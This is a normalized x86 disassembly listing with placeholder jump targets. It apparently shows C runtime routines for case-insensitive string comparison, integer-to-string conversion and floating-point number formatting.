xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_41eed0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_41ef49
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_40d831
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_40d1fa
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_4144f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_41813b
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_419964
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41f05e
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41ef49
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_41f090
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_41f0f1
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_41f12a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_41f0f1
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41ef49
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41ef49
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_41f1ea
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rwxdata ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f12a
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_41f0f1
sub_41f231
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_40d1fa
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_40d1fa
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_41f2eb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_41f231
pop ebp
retn
sub_41f315
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov ecx [ ebp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_41f231
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
inc eax
sub_41f356
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_40d1fa
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_40d1fa
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_4147b0
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_40d1fa
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_40e72d
mov eax esi
jmp r-xdata
sub_41f442
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
push edi
mov edi [ ebp + 0x10 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f356
pop edi
pop ebp
retn
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] eax
jae r-xdata
sub_41f477
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f356
pop edi
pop ebp
retn
sub_41f703
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_41f05e
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_420462
test eax eax
movsx eax [ esi ]
push eax
call sub_41f05e
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41f777
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_41f7f9
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_41f815
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_420a49
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_4208ca
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_41f871
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_413290
inc eax
push eax
push esi
add esi edi
push esi
call sub_40ba70
add esp 0x10
sub_41f8b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_40d831
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_40d1fa
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_40d1fa
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_41f871
pop esi
mov [ eax ] esi
call sub_40e72d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e6c1
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_419700
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rwxdata ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_40ba70
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_41fa17
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_420ca6
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_40d1fa
mov [ eax ] ebx
call sub_40e72d
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_41f8b6
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_420b40
add esp 0x10
test eax eax
je r-xdata
sub_41fade
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fa17
add esp 0x18
pop ebp
retn
sub_41fafe
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_40d831
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_40d1fa
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_40d1fa
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_40e72d
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
